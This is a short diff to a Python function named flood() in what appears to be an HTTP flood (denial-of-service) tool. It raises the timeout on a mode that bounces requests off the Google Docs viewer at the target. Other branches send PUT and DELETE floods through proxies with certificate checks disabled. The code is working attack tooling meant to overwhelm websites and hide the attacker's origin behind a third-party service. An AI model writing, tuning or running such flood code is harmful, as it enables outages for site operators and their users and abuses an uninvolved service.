@@ -53,7 +53,7 @@ def flood(target,domainname,attack,sock):
             elif attack =='put':
                 r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
             elif attack =='google':
-                r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=4)
+                r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
             elif attack =='delete':
                 r = s.delete(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
             else:
@@ -66,7 +66,7 @@ def flood(target,domainname,attack,sock):
             elif attack =='put':
                 r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False)
             elif attack =='google':
-                r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=4)
+                r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
             elif attack =='delete':
                 r = s.delete(target, params=payload, headers=headers, timeout=20 ,verify=False)
             else:
